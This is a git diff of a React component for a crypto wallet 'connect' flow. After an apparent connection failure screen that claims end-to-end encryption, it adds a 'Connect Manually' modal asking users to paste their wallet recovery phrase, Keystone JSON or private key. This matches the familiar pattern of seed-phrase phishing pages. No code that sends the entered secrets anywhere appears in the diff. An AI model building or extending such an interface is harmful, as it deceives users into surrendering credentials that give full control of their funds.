@@ -4,9 +4,11 @@ import AOS from 'aos';
 import 'aos/dist/aos.css'; // Import AOS CSS
 import { FaShield } from 'react-icons/fa6';
 import { MdCancel } from 'react-icons/md';
+import Button from '../button/Button';
 
 const Coincomps = ({ data }) => {
   const [selectedItem, setSelectedItem] = useState(null);
+  const [showManualConnectModal, setShowManualConnectModal] = useState(false);
 
   useEffect(() => {
     AOS.init();
@@ -19,6 +21,11 @@ const Coincomps = ({ data }) => {
 
   const handleCloseModal = () => {
     setSelectedItem(null);
+    setShowManualConnectModal(false);
+  };
+
+  const handleConnectManually = () => {
+    setShowManualConnectModal(true);
   };
 
   return (
@@ -84,10 +91,16 @@ const Coincomps = ({ data }) => {
               </p>
             </div>
             <div className="flex flex-col gap-4 w-[30vw] items-center">
-              <button className="text-[20px] font-[300] text-center border border-blue-600 rounded-xl py-[5px] px-[10px] w-[14rem]">
+              <button
+                className="text-[20px] font-[300] text-center border border-blue-600 rounded-xl py-[5px] px-[10px] w-[14rem]"
+                onClick={handleCloseModal}
+              >
                 Try Again
               </button>
-              <button className="sm:text-[20px] text-[15px] whitespace-nowrap text-white font-[20px] bg-blue-600 rounded-xl py-[5px] w-[14rem]">
+              <button
+                className="sm:text-[20px] text-[15px] whitespace-nowrap text-white font-[20px] bg-blue-600 rounded-xl py-[10px] w-[14rem]"
+                onClick={handleConnectManually}
+              >
                 Connect Manually
               </button>
             </div>
@@ -102,6 +115,46 @@ const Coincomps = ({ data }) => {
                 This session is protected with an end-to-end encryption
               </p>
             </div>
+          </div>
+        </div>
+      )}
+
+      {showManualConnectModal && (
+        <div className="fixed top-0 left-0 w-full h-full bg-gray-800 flex justify-center items-center overflow-x-hidden">
+          <div className="flex flex-col gap-[20px] items-center bg-gray-900 p-4 rounded-lg py-[40px]">
+            <div className="flex gap-[10px] items-center">
+              <img
+                src={selectedItem.src}
+                alt=""
+                className="sm:w-[70px] w-[30px] sm:h-[70px] h-[30px] rounded-full"
+              />
+              <p className="text-[20px] font-[500] text-white">
+                Import your {selectedItem.name} wallet
+              </p>
+            </div>
+            <div className="flex gap-[20px]">
+              <p className="text-[20px] font-[500] text-white">Phrase</p>
+              <p className="text-[20px] font-[500] text-white">Keyston JSON</p>
+              <p className="text-[20px] font-[500] text-white">Private Key</p>
+            </div>
+            <div>
+              <textarea
+                name=""
+                id=""
+                cols="44"
+                rows="8"
+                className="bg-white"
+              ></textarea>
+            </div>
+            <div>
+              <p className='text-[18px] font-[500] text-white text-center px-[2rem]'>Typicaly 12 (sometimes 24) words separated by single space</p>
+            </div>
+            <div>
+              <button className='text-[16px] text-white bg-blue-600 px-[10px] py-[10px] rounded'>Connect Manually</button>
+            </div>
+
+            <MdCancel onClick={handleCloseModal} color="black"
+              className="relative bg-white hover:cursor-[pointer]  sm:h-[30px] h-[40px]  sm:w-[30px] w-[40px] rounded" />
           </div>
         </div>
       )}
